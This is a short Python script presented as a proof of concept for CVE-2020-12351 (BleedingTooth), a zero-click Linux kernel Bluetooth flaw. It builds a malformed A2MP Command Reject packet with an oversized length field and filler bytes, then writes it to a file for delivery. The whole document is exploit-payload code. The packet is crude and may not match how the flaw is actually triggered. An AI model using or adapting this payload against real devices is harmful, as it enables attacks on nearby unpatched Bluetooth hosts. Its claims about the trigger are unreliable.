#!/usr/bin/env python3
"""CVE-2020-12351 — BleedingTooth (Linux kernel L2CAP A2MP). Zero-click:
any discoverable BR/EDR device with l2cap A2MP. Public (Google). HIGH."""
import sys, struct
from pathlib import Path

def build() -> bytes:
    # A2MP Command Reject with an oversized reason length
    # [code=0x01][ident=0x01][len=0xFFFF][reason...]
    return struct.pack("<BBH", 0x01, 0x01, 0xFFFF) + b"A" * 0x100

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2020-12351.bin")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2020-12351 A2MP -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
